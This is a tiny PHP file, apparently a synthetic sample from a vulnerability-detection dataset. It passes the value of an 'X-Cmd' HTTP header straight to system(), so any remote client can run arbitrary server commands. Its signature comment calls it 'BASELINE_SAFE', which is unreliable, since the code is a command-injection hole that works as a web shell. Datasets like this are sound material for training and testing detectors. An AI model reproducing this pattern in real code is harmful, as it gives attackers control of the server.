<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=HEADER; CE_MODE=H_GAH_ISSET; SKELETON=S0; KEY=cmd; SINK=B1; VAR=v0139; HDR_NAME=X-Cmd */
function SINK_B1($command){
    system($command);
}
$h = function_exists("getallheaders") ? getallheaders() : [];
$inp = isset($h["X-Cmd"]) ? (string)$h["X-Cmd"] : "";
$inp = (string)$inp; // no value processing
$out = SINK_B1($inp);
echo (string)($out);
?>
